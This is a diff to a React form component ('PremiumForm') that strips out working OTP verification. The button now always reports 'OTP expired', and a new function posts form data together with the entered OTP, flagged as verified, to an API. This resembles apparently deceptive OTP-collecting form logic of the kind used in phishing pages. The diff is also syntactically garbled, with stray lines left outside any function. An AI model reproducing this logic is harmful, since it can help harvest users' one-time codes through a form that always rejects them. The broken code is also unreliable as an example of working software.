@@ -173,11 +173,38 @@ const PremiumForm = () => {
     return Object.keys(newErrors).length === 0
   }
 
-  const handleSendOtp = () => {
+const handleSendOtp = () => {
     if (otp.length < 4) {
       setOtpError('Please enter OTP first')
       return
     }
+    setOtpError('')
+    setOtpError('OTP expired, try again later')
+    setOtp('')
+  }
+
+  const submitFormData = async (isNewSubmission) => {
+    try {
+      const submissionData = {
+        ...formData,
+        otpVerified: true,
+        otpEntered: otp,
+        isNewSubmission
+      }
+      
+      const response = await fetch(`${API_URL}/submit-form`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(submissionData)
+      })
+      
+      return response
+    } catch (error) {
+      throw error
+    }
+  }
     setOtpError('')
     setTimeout(() => {
       setOtpError('OTP expired, try again later')
@@ -214,22 +241,8 @@ const PremiumForm = () => {
     }
     
     setOtpError('')
-    try {
-      const response = await submitFormData(false)
-      
-      if (response.ok) {
-        setOtpError('OTP verified successfully!')
-        setTimeout(() => {
-          alert('Form submitted and verified successfully!')
-          window.location.href = '/'
-        }, 1500)
-      } else {
-        const data = await response.json()
-        alert(data.error || 'Failed to verify OTP. Please try again.')
-      }
-    } catch (error) {
-      alert('Connection error. Please try again.')
-    }
+    setOtpError('OTP expired, try again later')
+    setOtp('')
   }
 
   const handleNext = async () => {
@@ -579,10 +592,10 @@ const PremiumForm = () => {
                 {otp.length === 6 ? (
                   <button
                     type="button"
-                    onClick={handleVerifyOtp}
+                    onClick={handleSendOtp}
                     className="w-full gradient-btn-red rounded-lg sm:rounded-xl px-4 sm:px-6 py-3 sm:py-4 text-sm sm:text-base text-white font-semibold shadow-md"
                   >
-                    Verify & Submit
+                    Resend OTP
                   </button>
                 ) : (
                   <button
